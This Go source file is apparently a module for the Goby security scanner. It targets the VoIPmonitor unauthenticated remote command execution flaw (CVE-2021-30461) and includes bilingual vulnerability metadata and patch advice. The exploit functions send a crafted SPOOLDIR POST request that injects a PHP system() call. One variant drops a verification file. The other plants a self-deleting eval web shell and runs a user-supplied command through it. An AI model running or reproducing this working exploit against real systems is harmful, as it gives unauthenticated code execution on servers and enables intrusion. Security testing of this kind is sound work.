package exploits

import (
	"fmt"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"strings"
)

func init() {
	expJson := `{
    "Name": "VoIPmonitor UnAuth RCE (CVE-2021-30461)",
    "Description": "VoIPmonitor is open source network packet sniffer with commercial frontend for SIP RTP and RTCP VoIP protocols running on linux. VoIPmonitor is designed to analyze quality of VoIP call based on network parameters - delay variation and packet loss according to ITU-T G.107 E-model which predicts quality on MOS scale. Calls with all relevant statistics are saved to MySQL or ODBC database.",
    "Impact": "VoIPmonitor UnAuth RCE (CVE-2021-30461)",
    "Recommendation": "<p>The manufacturer has fixed this vulnerability in 24.61 and later versions, users are advised to update to 24.61 or later versions in time: <a href=\"http://www.voipmonitor.org/\">http:/ /www.voipmonitor.org/</a></p><p>1. Set access policies and whitelist access through security devices such as firewalls. </p><p>2. If not necessary, prohibit public network access to the system. </p>",
    "Product": "VoIPmonitor",
    "VulType": [
        "Command Execution"
    ],
    "Tags": [
        "Command Execution",
        "2H1W"
    ],
    "Translation": {
        "CN": {
            "Name": "VoIPmonitor 开源网络数据包嗅探器远程命令执行漏洞 （CVE-2021-30461）",
            "Description": "<p>VoIPmonitor是具有商业前端的开源网络数据包嗅探器，用于在Linux上运行的SIP RTP和RTCP VoIP协议。VoIPmonitor旨在根据ITU-T G.107 E模型根据网络参数分析VoIP呼叫的质量-延迟变化和数据包丢失，该模型可预测MOS规模的质量。 具有所有相关统计信息的调用将保存到MySQL或ODBC数据库中。</p><p>VoIPmonitor存在远程命令执行漏洞，攻击者可以利用该漏洞远程执行命令，植入木马后门控制服务器，给用户造成难以估计的损失。</p>",
            "Impact": "<p>VoIPmonitor存在远程命令执行漏洞，攻击者可以利用该漏洞远程执行命令，植入木马后门控制服务器，给用户造成难以估计的损失。<br></p>",
            "Recommendation": "<p>⼚商已在24.61及之后的版本中修复该漏洞，建议用户及时更新到24.61或之后的版本：<a href=\"http://www.voipmonitor.org/\">http://www.voipmonitor.org/</a></p><p>1、通过防⽕墙等安全设备设置访问策略，设置⽩名单访问。</p><p>2、如⾮必要，禁⽌公⽹访问该系统。</p>",
            "Product": "VoIPmonitor",
            "VulType": [
                "命令执行"
            ],
            "Tags": [
                "命令执行",
                "两高一弱"
            ]
        },
        "EN": {
            "Name": "VoIPmonitor UnAuth RCE (CVE-2021-30461)",
            "Description": "VoIPmonitor is open source network packet sniffer with commercial frontend for SIP RTP and RTCP VoIP protocols running on linux. VoIPmonitor is designed to analyze quality of VoIP call based on network parameters - delay variation and packet loss according to ITU-T G.107 E-model which predicts quality on MOS scale. Calls with all relevant statistics are saved to MySQL or ODBC database.",
            "Impact": "VoIPmonitor UnAuth RCE (CVE-2021-30461)",
            "Recommendation": "<p>The manufacturer has fixed this vulnerability in 24.61 and later versions, users are advised to update to 24.61 or later versions in time: <a href=\"http://www.voipmonitor.org/\">http:/ /www.voipmonitor.org/</a></p><p>1. Set access policies and whitelist access through security devices such as firewalls. </p><p>2. If not necessary, prohibit public network access to the system. </p>",
            "Product": "VoIPmonitor",
            "VulType": [
                "Command Execution"
            ],
            "Tags": [
                "Command Execution",
                "2H1W"
            ]
        }
    },
    "FofaQuery": "title=\"VoIPmonitor\"",
    "GobyQuery": "title=\"VoIPmonitor\"",
    "Author": "go0p",
    "Homepage": "http://www.voipmonitor.org/",
    "DisclosureDate": "2021-04-19",
    "References": [
        "http://fofa.so"
    ],
    "HasExp": true,
    "Is0day": false,
    "Level": "3",
    "CVSS": "9.3",
    "CVEIDs": [
        "CVE-2021-30461"
    ],
    "CNVD": [],
    "CNNVD": [],
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExpParams": [
        {
            "name": "cmd",
            "type": "input",
            "value": "echo+md5(1);",
            "show": ""
        }
    ],
    "ExpTips": {
        "type": "",
        "content": ""
    },
    "AttackSurfaces": {
        "Application": [],
        "Support": [],
        "Service": [],
        "System": [],
        "Hardware": []
    },
    "PocId": "9687"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			randStr1 := goutils.RandomHexString(8)
			randStr2 := goutils.RandomHexString(4)
			execStr := "<?php echo \\'" + randStr1 + "\\'; unlink(__FILE__); ?>"
			raw1 := `
POST /index.php HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:86.0) Gecko/20100101 Firefox/86.0
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Content-Length: 49
SPOOLDIR=test".system('echo \'%s\' > %s.php')."&recheck=annen
`
			cfg := httpclient.NewRequestConfigFromRaw(fmt.Sprintf(raw1, execStr, randStr2))
			cfg.VerifyTls = false
			if _, err := httpclient.DoHttpRequest(u, cfg); err == nil {
				if resp, err := httpclient.SimpleGet(u.FixedHostInfo + "/" + randStr2 + ".php"); err == nil && strings.Contains(resp.RawBody, randStr1) {
					return true
				}
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			randStr2 := goutils.RandomHexString(4)
			cmd := ss.Params["cmd"].(string)
			execStr := "<?php @eval($_GET[cmd]);unlink(__FILE__);?>"
			raw1 := `
POST /index.php HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:86.0) Gecko/20100101 Firefox/86.0
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Content-Length: 49
SPOOLDIR=test".system('echo \'%s\' > %s.php')."&recheck=annen
`
			cfg := httpclient.NewRequestConfigFromRaw(fmt.Sprintf(raw1, execStr, randStr2))
			cfg.VerifyTls = false
			if _, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg); err == nil {
				if resp, err := httpclient.SimpleGet(expResult.HostInfo.FixedHostInfo + "/" + randStr2 + ".php?cmd=" + cmd); err == nil && resp.StatusCode == 200 {
					expResult.Success = true
					expResult.Output = resp.Utf8Html
				}
			}
			return expResult
		},
	))
}
